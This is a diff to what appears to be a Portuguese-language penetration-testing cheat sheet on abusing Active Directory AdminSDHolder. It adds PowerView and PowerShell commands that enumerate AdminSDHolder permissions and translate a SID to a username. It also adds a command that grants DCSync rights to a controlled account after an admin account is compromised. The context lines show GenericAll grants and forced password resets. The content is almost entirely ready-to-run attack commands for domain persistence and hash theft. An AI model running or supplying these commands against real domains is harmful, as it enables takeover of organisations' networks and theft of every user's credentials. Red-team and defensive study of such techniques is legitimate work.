@@ -1605,6 +1605,16 @@ $FormatEnumerationLimit=-1
 ```
 (Get-Acl -Path 'AD:\CN=AdminSDHolder,CN=System,DC=TECH,DC=LOCAL').Access | ?{$_.IdentityReference -match 'pentester'} | Select IdentityReference, AccessControlType, ActiveDirectoryRights
 ```
+##### ADMIN SDHOLDER - LIST PERMISSIONS (POWERVIEW)
+```
+Get-ObjectAcl -Identity 'CN=AdminSDHolder,CN=System,DC=TECH,DC=LOCAL' | Select SecurityIdentifier, AccessControlType, ActiveDirectoryRights
+```
+TRADUZIR SID PARA USERNAME:
+```
+$SID = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-21-4215187987-3124207031-433979976-1109")
+$objUser = $SID.Translate([System.Security.Principal.NTAccount])
+$objUser.Value
+```
 ##### ADMIN SDHOLDER - ADICIONAR GENERICALL PARA USUARIO
 ```
 $MyAdmin = (get-aduser pentester).sid
@@ -1650,7 +1660,10 @@ Set-ADAccountPassword -Identity goku -Reset -NewPassword $MyPassword
 ```
 Set-ADAccountPassword -Identity goku -Reset -NewPassword (ConvertTo-SecureString -AsPlainText -Force -String aaabbbccc) -Verbose
 ```
-
+##### ADMIN SDHOLDER - DEPOIS DE PEGAR UMA CONTA DE ADMIN, ABUSAR DE PERMISSÃO PARA CONFIGURAR PERMISSÃO PARA DCSYNC
+```
+Add-ObjectAcl -TargetIdentity 'DC=TECH,DC=LOCAL' -PrincipalIdentity pentester -Rights DCSync -Verbose
+```
 
 
 
